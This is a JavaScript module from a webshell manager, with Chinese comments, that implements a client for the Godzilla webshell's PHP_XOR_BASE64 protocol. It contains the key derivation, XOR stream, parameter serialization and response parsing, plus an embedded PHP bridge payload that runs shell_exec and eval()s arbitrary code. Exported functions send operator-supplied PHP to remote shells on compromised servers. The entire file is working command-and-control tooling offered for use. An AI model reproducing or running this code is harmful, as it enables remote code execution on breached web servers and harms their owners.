// dsh-webshell-mgr 原生哥斯拉兼容通道（godzilla，PHP_XOR_BASE64 默认形态）：
//   连接字段语义：password = POST 参数名（哥斯拉的「密码」即字段名），secret_key = 密钥源；
//   马侧密钥 key = md5(secretKey)[0:16]。
//   初始化：首包发送桥接载荷（马侧以 session 注册，载荷文本须含 "getBasicsInfo" 字面量）。
//   请求体 = "<pass>=<urlencode(base64(XOR(serialize(params), key 流)))>"
//     参数序列化：逐对 keyBytes + 0x02 + int32LE(len) + valueBytes
//     XOR 流：data[i] ^ key[(i+1) & 15]
//   响应 = md5(pass+key)[0:16] + base64(XOR(result)) + md5(pass+key)[16:32]
// 实现策略与冰蝎通道一致：桥接载荷（run($pms) → methodName 分派 → wsmBridge eval），
// 不内嵌外部载荷文件——协议契约兼容、代码全自有。

import { httpRequest, b64, unb64, md5hex, cookieHeaderFor, absorbCookies } from "./http-client.js";

const BRIDGE_PAYLOAD = `// wsm bridge payload (getBasicsInfo entry compatible)
function run($pms){
    $parameters = array();
    $pos = 0; $len = strlen($pms);
    while ($pos < $len) {
        $sep = strpos($pms, "\\x02", $pos);
        if ($sep === false) break;
        $k = substr($pms, $pos, $sep - $pos);
        $vl = ord($pms[$sep+1]) | (ord($pms[$sep+2])<<8) | (ord($pms[$sep+3])<<16) | (ord($pms[$sep+4])<<24);
        $parameters[$k] = substr($pms, $sep + 5, $vl);
        $pos = $sep + 5 + $vl;
    }
    $out = '';
    if (isset($parameters['methodName'])) {
        $m = $parameters['methodName'];
        if ($m === 'getBasicsInfo') {
            $u = '';
            if (function_exists('shell_exec')) { $u = @shell_exec(PHP_OS_FAMILY === 'Windows' ? 'whoami' : 'id -un'); }
            $out = json_encode(array('user' => trim((string)$u), 'os' => PHP_OS, 'cwd' => getcwd(), 'php' => PHP_VERSION));
        } elseif ($m === 'wsmBridge' && isset($parameters['code'])) {
            ob_start();
            try { eval($parameters['code']); } catch (Throwable $e) {}
            $out = ob_get_clean();
        }
    }
    return $out;
}
`;

// 会话作用域必须绑定目标 URL——同协议探测不同马时，前一会话凭据（nonce/通行证）
// 不得串扰后一目标（曾致跨马协商失败与解密垃圾）
const scopeOf = (conn) => (conn.__scope ?? conn.id ?? conn.url) + "@" + String(conn.url ?? "");
const inited = new Set(); // scopeKey → 已完成载荷注册

function keyOf(conn) {
	return md5hex(String(conn.secret_key ?? conn.secretKey ?? "")).slice(0, 16);
}

function xorStream(buf, key) {
	const out = Buffer.alloc(buf.length);
	const kb = Buffer.from(key, "utf8");
	for (let i = 0; i < buf.length; i++) out[i] = buf[i] ^ kb[(i + 1) & 15];
	return out;
}

/** 哥斯拉参数序列化：key + \x02 + int32LE(len) + value（逐对拼接）。 */
export function serializeParams(params) {
	const parts = [];
	for (const [k, v] of Object.entries(params)) {
		const vb = Buffer.isBuffer(v) ? v : Buffer.from(String(v), "utf8");
		const len = Buffer.alloc(4);
		len.writeUInt32LE(vb.length, 0);
		parts.push(Buffer.concat([Buffer.from(k, "utf8"), Buffer.from([0x02]), len, vb]));
	}
	return Buffer.concat(parts);
}

async function post(conn, bodyParams) {
	const key = keyOf(conn);
	const pass = String(conn.password ?? "");
	const encoded = b64(xorStream(serializeParams(bodyParams), key));
	const body = `${pass}=${encodeURIComponent(encoded)}`;
	const scope = scopeOf(conn);
	const res = await httpRequest({
		url: conn.url,
		method: "POST",
		headers: {
			"content-type": "application/x-www-form-urlencoded",
			...(cookieHeaderFor(scope) ? { cookie: cookieHeaderFor(scope) } : {}),
			...(conn.headers ?? {})
		},
		body,
		timeoutMs: conn.timeoutMs
	});
	absorbCookies(scope, res.headers);
	return res;
}

/** 首包：注册桥接载荷（马侧写入 session）。 */
async function ensureInit(conn) {
	const scope = scopeOf(conn);
	if (inited.has(scope)) return;
	const key = keyOf(conn);
	const pass = String(conn.password ?? "");
	const payloadBody = b64(xorStream(Buffer.from(BRIDGE_PAYLOAD, "utf8"), key));
	const body = `${pass}=${encodeURIComponent(payloadBody)}`;
	const res = await httpRequest({
		url: conn.url,
		method: "POST",
		headers: { "content-type": "application/x-www-form-urlencoded", ...(conn.headers ?? {}) },
		body,
		timeoutMs: conn.timeoutMs
	});
	absorbCookies(scope, res.headers);
	if (!/PHPSESSID/i.test(cookieHeaderFor(scope) ?? "")) throw new Error("载荷注册失败：未建立会话（pass 字段名/密钥可能不符）");
	inited.add(scope);
}

/** 解析响应：md5 定位符之间 → b64 → XOR → 明文。 */
function parseResponse(conn, bodyBuffer) {
	const key = keyOf(conn);
	const md = md5hex(String(conn.password ?? "") + key);
	const text = bodyBuffer.toString("utf8");
	const left = md.slice(0, 16);
	const right = md.slice(16);
	const i = text.indexOf(left);
	const j = text.indexOf(right, i + left.length);
	if (i < 0 || j < 0) return null;
	const mid = text.slice(i + left.length, j).trim();
	return xorStream(unb64(mid), key);
}

/** 调用一个方法（经桥接载荷）。 */
export async function callMethod(conn, methodName, extraParams = {}) {
	await ensureInit(conn);
	const res = await post(conn, { methodName, ...extraParams });
	if (res.status !== 200) throw new Error(`马侧拒绝（HTTP ${res.status}）`);
	const out = parseResponse(conn, res.bodyBuffer);
	if (out === null) throw new Error("响应定位失败（md5 定位符不符——pass/密钥可能不匹配）");
	return out;
}

/** eval PHP 代码（桥接载荷 wsmBridge）。 */
export async function evalPhp(conn, code) {
	return (await callMethod(conn, "wsmBridge", { code })).toString("utf8");
}

/** 基本信息结构化（桥接载荷 getBasicsInfo）。 */
export async function basicInfo(conn) {
	const raw = await callMethod(conn, "getBasicsInfo");
	try { return JSON.parse(raw.toString("utf8")); } catch { return null; }
}

const probeToken = () => "WSMP" + Math.random().toString(36).slice(2, 10).toUpperCase();

export async function probe(conn) {
	try {
		const token = probeToken();
		const out = await evalPhp({ ...conn, timeoutMs: Math.min(conn.timeoutMs, 9000) }, `echo "${token}";`);
		return out.includes(token) ? { tokenOutput: out } : null;
	} catch {
		return null;
	}
}

/** 连接删除/重连时清注册态。 */
export function invalidate(scopeKey) {
	inited.delete(scopeKey);
}

export const godzillaCodec = {
	id: "godzilla",
	label: "哥斯拉型通道（PHP_XOR_BASE64）",
	langs: ["php"],
	caps: { cmd: true, code: true, b64rw: false },
	evalPhp,
	callMethod,
	basicInfo
};
